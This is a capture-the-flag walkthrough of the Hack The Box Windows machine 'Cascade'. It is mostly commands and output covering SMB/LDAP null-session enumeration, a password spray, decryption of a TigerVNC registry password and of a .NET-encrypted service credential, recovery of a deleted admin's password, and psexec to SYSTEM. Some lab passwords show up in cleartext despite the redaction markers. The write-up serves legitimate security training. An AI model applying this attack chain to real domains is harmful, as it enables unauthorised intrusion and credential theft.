---
title: HTB - Cascade
date: 2024-03-19
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, cascade, nmap, netexec, nxc, smb, null-session, password-spray, dnscmd, dns-admins, msfvenom, psexec, active-directory, windows, winrm, evil-winrm]
img_path: /assets/htb/fullpwn/cascade
published: true
image:
    path: machine_info.png
---

## HTB: Cascade

>[Cascade Box](https://app.hackthebox.com/machines/235)

![](cascade_diagram.png){: .normal}

## Walkthrough Summary

|Step|Action|Tool|Achieved|
|-|-|-|-|
|1|SMB Enumeration|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained usernames|
|2|LDAP Enumeration|[ldapsearch](https://linux.die.net/man/1/ldapsearch)|Obtained password|
|3|Password Spray|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained credentials for _r.thompson_|
|4|SMB Enumeration|[NetExec](https://github.com/Pennyw0rth/NetExec), [Metasploit](https://github.com/rapid7/metasploit-framework)|Obtained credentials for _s.smith_ (initial foothold)|
|5|SMB Enumeration|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained username and encrypted password|
|6|Reverse Engineering|[dnspy](https://github.com/dnSpy/dnSpy)|Obtained credentials for _ArkSvc_|
|7|System Enumeration|[LOTL*](https://encyclopedia.kaspersky.com/glossary/lotl-living-off-the-land/), [psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)|Obtained credentials & compromised domain|

*_Living Off The Land_

## Attack Chain Reproduction Steps

TCP all-ports scan:

```bash
$ sudo nmap 10.10.10.182 -T4 -A -open -p-

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-19 16:15:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
```

Enumerate SMB via NULL session:

```bash
# enumerate password policy
$ nxc smb 10.10.10.182 -u '' -p '' --pass-pol
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\:
SMB         10.10.10.182    445    CASC-DC1         [+] Dumping password info for domain: CASCADE
SMB         10.10.10.182    445    CASC-DC1         Minimum password length: 5
SMB         10.10.10.182    445    CASC-DC1         Password history length: None
SMB         10.10.10.182    445    CASC-DC1         Maximum password age: Not Set
SMB         10.10.10.182    445    CASC-DC1
SMB         10.10.10.182    445    CASC-DC1         Password Complexity Flags: 000000
SMB         10.10.10.182    445    CASC-DC1             Domain Refuse Password Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Store Cleartext: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Lockout Admins: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password No Clear Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password No Anon Change: 0
SMB         10.10.10.182    445    CASC-DC1             Domain Password Complex: 0
SMB         10.10.10.182    445    CASC-DC1
SMB         10.10.10.182    445    CASC-DC1         Minimum password age: None
SMB         10.10.10.182    445    CASC-DC1         Reset Account Lockout Counter: 30 minutes
SMB         10.10.10.182    445    CASC-DC1         Locked Account Duration: 30 minutes
SMB         10.10.10.182    445    CASC-DC1         Account Lockout Threshold: None
SMB         10.10.10.182    445    CASC-DC1         Forced Log off Time: Not Set

# enumerate domain users
$ nxc smb 10.10.10.182 -u '' -p '' --users --log nxc_users.lst
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\:
SMB         10.10.10.182    445    CASC-DC1         [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated domain user(s)
SMB         10.10.10.182    445    CASC-DC1         cascade.local\CascGuest                      Built-in account for guest access to the computer/domain
SMB         10.10.10.182    445    CASC-DC1         cascade.local\arksvc
SMB         10.10.10.182    445    CASC-DC1         cascade.local\s.smith
SMB         10.10.10.182    445    CASC-DC1         cascade.local\r.thompson
SMB         10.10.10.182    445    CASC-DC1         cascade.local\util
SMB         10.10.10.182    445    CASC-DC1         cascade.local\j.wakefield
SMB         10.10.10.182    445    CASC-DC1         cascade.local\s.hickson
SMB         10.10.10.182    445    CASC-DC1         cascade.local\j.goodhand
SMB         10.10.10.182    445    CASC-DC1         cascade.local\a.turnbull
SMB         10.10.10.182    445    CASC-DC1         cascade.local\e.crowe
SMB         10.10.10.182    445    CASC-DC1         cascade.local\b.hanson
SMB         10.10.10.182    445    CASC-DC1         cascade.local\d.burman
SMB         10.10.10.182    445    CASC-DC1         cascade.local\BackupSvc
SMB         10.10.10.182    445    CASC-DC1         cascade.local\j.allen
SMB         10.10.10.182    445    CASC-DC1         cascade.local\i.croft

# create a user list
$ cat nxc_users.lst | cut -d"\\" -f2 | cut -d" " -f1 > domain_users.txt
```

LDAP enumeration:

```bash
# enumerate naming contexts
$ ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Dump all LDAP info and search low-frequency fields:

```bash
# dump all LDAP info
$ $ ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' > ldapsearch_output

# search for anomalies
$ cat ldapsearch_output | awk '{print $1}' | sort | uniq -c | sort -n | grep ':'
<SNIP>
      1 cascadeLegacyPwd:
<SNIP>
```

Search for the field found in the LDAP output:

```bash
$ cat ldapsearch_output | grep cascadeLegacyPwd
cascadeLegacyPwd: clk0bjVldmE=
# decode the string
$ echo 'clk0bjVldmE=' | base64 -d
r<REDACTED>a
```

Perform a password spray:

```bash
$ nxc smb 10.10.10.182 -u domain_users.txt -p 'r<REDACTED>a' | grep +
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:r<REDACTED>a
```

Check for WinRM access:

```bash
$ nxc winrm 10.10.10.182 -u 'r.thompson' -p 'r<REDACTED>a'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:r<REDACTED>a
```

Check SMB share access:

```bash
$ nxc smb 10.10.10.182 -u 'r.thompson' -p 'r<REDACTED>a' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

Enumerate readable files:

```bash
$ smbclient -U r.thompson //10.10.10.182/Data
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 03:27:34 2020
  ..                                  D        0  Mon Jan 27 03:27:34 2020
  Contractors                         D        0  Mon Jan 13 01:45:11 2020
  Finance                             D        0  Mon Jan 13 01:45:06 2020
  IT                                  D        0  Tue Jan 28 18:04:51 2020
  Production                          D        0  Mon Jan 13 01:45:18 2020
  Temps                               D        0  Mon Jan 13 01:45:15 2020

                6553343 blocks of size 4096. 1624545 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (23.0 KiloBytes/sec) (average 23.0 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (11.8 KiloBytes/sec) (average 17.4 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (53.0 KiloBytes/sec) (average 29.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (25.7 KiloBytes/sec) (average 28.5 KiloBytes/sec)
smb: \> exit

# list directory structure
$ tree
.
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

14 directories, 4 files
```

In the email below, the account `TempAdmin` is mentioned, but no such user was enumerated so far. That is because the Cascade box was created on 2020, but the account was deleted at the end of 2018:

![](cascade_email.png)

We can see that the `TempAdmin` account was indeed deleted by `ArkSvc` at the end of 2018 in recycle bin log below. There is also a password in hexadecimal format within the `Install.reg` file:

```bash
$ cat IT/Logs/Ark\ AD\ Recycle\ Bin/ArkAdRecycleBin.log
<SNIP>
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0

$ cat IT/Temp/s.smith/VNC\ Install.reg
��Windows Registry Editor Version 5.00

<SNIP>
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
<SNIP>
```

It does not seem possible to convert the password to plaintext directly:

```bash
# decrypt hex to binary to plaintext
$ echo 6bcf2a4b6e5aca0f | xxd -r -p
k�*KnZ�
```

There is a [way](https://github.com/frizb/PasswordDecrypts) to decrypt TigerVNC passwords via Metasploit:

```bash
$ msfconsole -q
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey 
=> "s<REDACTED>2"
```

Check for WinRM access:

```bash
$ nxc winrm casc-dc1.cascade.local -u 's.smith' -p 's<REDACTED>2'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:s<REDACTED>2 (Pwn3d!)
```

Obtain initial foothold and compromise `user.txt`:

```bash
$ evil-winrm -i 10.10.10.182 -u s.smith -p s<REDACTED>2

<SNIP>
*Evil-WinRM* PS C:\Users\s.smith\Documents> gc ..\desktop\user.txt
0<REDACTED>d
```

Check user's information:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /all

<SNIP>

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
<SNIP>
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
<SNIP>
```

This user seems to have access to the `Audit` share:

```bash
# check share access
$ nxc smb 10.10.10.182 -u 's.smith' -p 's<REDACTED>2' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ
<SNIP>

# connect to the share and download readable files
$ smbclient -U s.smith //10.10.10.182/Audit$
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (89.7 KiloBytes/sec) (average 89.7 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (103.4 KiloBytes/sec) (average 95.8 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.4 KiloBytes/sec) (average 67.9 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (1606.3 KiloBytes/sec) (average 644.1 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (1471.8 KiloBytes/sec) (average 787.9 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (187.5 KiloBytes/sec) (average 696.6 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (6483.8 KiloBytes/sec) (average 2009.2 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (1447.7 KiloBytes/sec) (average 1764.5 KiloBytes/sec)
smb: \> exit

# check directory structure
$ tree
.
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll
```

Enumerate the database:

```bash
# check the type of the file
$ file DB/Audit.db
DB/Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60

# dump the contents of the database
$ sqlite3 DB/Audit.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
<SNIP>
```

The password seems to be encrypted:

```bash
$ echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d
������D�|zC�;
```

Transfer the directory over a Windows box:

```bash
# start an smb server to serve the files
$ smbserver -smb2support share $(pwd)
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Grab the IP address of the Windows box:

```bash
$ ip a show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:e0:94:0a brd ff:ff:ff:ff:ff:ff
    inet 172.31.150.94/20 brd 172.31.159.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fee0:940a/64 scope link
       valid_lft forever preferred_lft forever
```

Access the SMB share via the Windows box:

![](cascade_windows_transfer.png)

Reverse engineer the files with [`dnSpy`](https://github.com/dnSpy/dnSpy):

![](cascade_casccrypto_dll.png)

![](cascade_executable.png)

Decipher the password on [CyberChef](https://gchq.github.io/CyberChef/):

![](cascade_cyberchef.png)

Confirm credentials:

```bash
$ nxc winrm 10.10.10.182 -u ArkSvc -p w<REDACTED>d
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\ArkSvc:w<REDACTED>d (Pwn3d!)
```

Login to the DC:

```bash
$ evil-winrm -i 10.10.10.182 -u ArkSvc -p w<REDACTED>d

<SNIP>
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

<SNIP>

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
<SNIP>
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
<SNIP>
```

This user is a member of the `AD Recycle Bin` group which has the ability to [query deleted objects](https://o365info.com/restore-active-directory-deleted-user-account-using-active-directory-recycle-bin-article-4-4-part-16-23/). One of them is the account `TempAdmin` which also has a `cascadeLegacyPwd` field:

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -IncludeDeletedObjects -Filter {ObjectClass -eq "user"} -Properties *

<SNIP>
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
<SNIP>
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
<SNIP>
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
<SNIP>
sAMAccountName                  : TempAdmin
<SNIP>
```

This time the password is just base64-encrypted:

```bash
$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
b<REDACTED>s
```

The email found earlier let us know that the password for `TempAdmin` was the same password as of the "normal admin account", so we can use them to achieve full domain compromise and read the `root.txt` file:

```bash
$ psexec cascade.local/administrator@10.10.10.182
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file jcdcxKpm.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service Hssb on 10.10.10.182.....
[*] Starting service Hssb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
b<SNIP>1
```
